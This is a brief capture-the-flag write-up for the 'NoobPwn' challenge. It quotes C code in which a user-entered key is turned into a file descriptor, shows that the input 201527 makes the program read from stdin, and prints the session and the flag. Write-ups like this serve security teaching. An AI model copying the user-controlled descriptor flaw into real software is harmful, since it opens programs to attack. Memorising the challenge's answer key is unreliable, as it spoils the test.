# NoobPwn
Pwn - 30 points

## Challenge 
> Getting tired of pwn? How about an easier one?
nc pwn2.chal.gryphonctf.com 17346

> Creator - @LFlare


[noobpwn-a927b91937e19b93cb50f4a96ad82667.c](noobpwn-a927b91937e19b93cb50f4a96ad82667.c)

[noobpwn-redacted-564e969dbbe6bbd0da1c3e1064b379a5](noobpwn-redacted-564e969dbbe6bbd0da1c3e1064b379a5)

## Solution


Vulnerability is that we can control the file descriptor pointer `fd`.

    printf("Key? ");
    scanf("%d", &key);

    // Create file descriptor
    int fd = key - 0x31337;
    int len = read(fd, buf, 32);

Set `fd = 0` to make it read from `stdin`.
(Also since `scanf` takes in decimal, `0x31337` = `201527`)

	$ nc pwn2.chal.gryphonctf.com 17346
	Key? 201527
	GIMMEDAFLAG
	GCTF{f1l3_d35cr1p70r5_4r3_n457y}

## Flag
`GCTF{f1l3_d35cr1p70r5_4r3_n457y}`